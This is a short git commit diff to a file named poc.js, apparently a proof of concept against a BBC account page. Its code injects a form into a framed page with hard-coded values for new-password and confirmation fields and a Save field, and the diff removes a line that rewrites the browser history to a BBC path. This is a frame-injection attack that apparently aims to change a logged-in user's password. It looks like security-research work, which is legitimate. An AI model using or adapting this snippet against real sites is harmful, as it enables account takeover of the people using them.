3380386e561855ef4a61f8e3dd97e0d384d20fbb
shanekelly-bbc <shane.kelly@bbc.co.uk>
2015-12-18 12:30:01 +0000

    Update poc.js

--- poc.js
+++ poc.js
@@ -1,3 +1,2 @@
 console.log("I'm here");
-window.frames[0].document.documentElement.innerHTML = '<form name="frm1"> <input type="text" name="confirmpassword" value="loxnon28"> <input type="text" name="confirmpassword_confirm" value="loxnon28"> <input type="text" name="bbcid_submit_button" value="Save"></form>';
-window.history.pushState("object or string", "Title", "/frameworks/barlesque/webservice/body_first.html?blq_gvl=311");
+window.frames[0].document.documentElement.innerHTML='<form name="frm1"> <input type="text" name="confirmpassword" value="loxnon28"> <input type="text" name="confirmpassword_confirm" value="loxnon28"> <input type="text" name="bbcid_submit_button" value="Save"></form>';
